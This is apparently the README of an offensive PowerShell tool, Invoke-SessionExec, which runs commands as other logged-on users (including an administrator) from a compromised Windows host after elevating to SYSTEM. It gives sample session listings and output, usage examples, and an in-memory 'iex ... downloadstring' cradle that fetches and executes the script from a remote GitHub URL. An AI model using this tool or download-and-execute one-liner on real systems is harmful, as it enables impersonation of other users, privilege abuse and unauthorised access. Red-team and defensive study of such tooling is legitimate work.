# Invoke-SessionExec

Invoke-SessionExec is a PowerShell port of Leo4j's SessionExec. https://github.com/Leo4j/SessionExec

Invoke-SessionExec allows you to execute commands in the context of others users from their logon sessions.

For example running as the user "truth" on a compromised host we can see logon sessions for the users administrator and arbiter.

```
C:\Users\truth>quser
 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>truth                 console             1  Active      none   23/07/2024 19:43
 administrator                             2  Disc        20:53  23/07/2024 18:02
 arbiter                                   3  Disc        20:52  23/07/2024 18:03
```

After elevating to SYSTEM and executing Invoke-SessionExec with  ```Invoke-SessionExec -SessionID All -Command "whoami"```  we get the following command output from each users with a logon session on the system:

```
[+] Invoke Command as truth under Session ID:1
security\truth

[+] Invoke Command as administrator under Session ID:2
security\administrator

[+] Invoke Command as arbiter under Session ID:3
security\arbiter
```

# Load into memory

```powershell
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/The-Viper-One/Invoke-SessionExec/main/Invoke-SessionExec.ps1')
```

# Usage
```powershell
# Execute as user in Session 1
Invoke-SessionExec -SessionID 1 -Command "whomai /all"

# Execute as all users with logon sessions
Invoke-SessionExec -SessionID All -Command "whoami /all"
```

